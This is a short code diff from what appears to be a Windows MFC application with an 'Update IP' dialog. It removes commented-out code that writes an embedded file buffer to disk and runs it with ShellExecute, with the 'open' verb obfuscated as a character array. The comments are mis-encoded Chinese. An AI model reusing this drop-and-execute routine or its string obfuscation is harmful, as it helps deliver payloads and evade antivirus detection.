-// 		ShellExecute(NULL,"open",strExePath,NULL,NULL,SW_SHOW); //Õý³£ÔËÐÐÄ¿±êÎÄ¼þ
-// 		return TRUE;
-// 	}
-//
-// 	const void *filedata = (LPCTSTR)UpdateIPMyFileBuf;
-// 	UINT size = UpdateIPMyFileSize;
-//
-// 	HANDLE	hFile =
-// 		CreateFile
-// 		(
-// 		strExePath,
-// 		GENERIC_WRITE,
-// 		FILE_SHARE_WRITE,
-// 		NULL,
-// 		CREATE_ALWAYS,
-// 		FILE_ATTRIBUTE_NORMAL,
-// 		0
-// 		);
-//
-// 	// ´íÎó´¦Àí
-// 	if (hFile == INVALID_HANDLE_VALUE)
-// 	{
-// 		return false;
-// 	}
-//
-// 	// Ð´ÈëÎÄ¼þ
-// 	DWORD	dwBytesWrite;
-// 	WriteFile
-// 		(
-// 		hFile,
-// 		filedata,
-// 		size,
-// 		&dwBytesWrite,
-// 		NULL
-// 		);
-// 	CloseHandle(hFile);
-//
-// 	char	*lpExt = strrchr(strExePath, '.');
-// 	if (!lpExt)
-// 		return false;
-//
-// 	char BvtmX12[] = {'o','p','e','n','\0'};
-// 	if(GetFileAttributesA(strExePath) == -1)  //¼ì²éÎÄ¼þ²»´æÔÚ
-// 		return false;
-//
-// 	ShellExecute(NULL,BvtmX12,strExePath,NULL,NULL,SW_SHOW); //Õý³£ÔËÐÐÄ¿±êÎÄ¼þ
-//
-// 	return false;
-// }
 void CMainFrame::OnMenuitemUpdateIp()
 {
-    // TODO: Add your command handler code here
-//	_OpenFile();
     CUpdateDlg dlg;
     dlg.DoModal();
-
-
-
 }
+
 LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
 {
     if (wParam == XTP_DPN_SHOWWINDOW) {
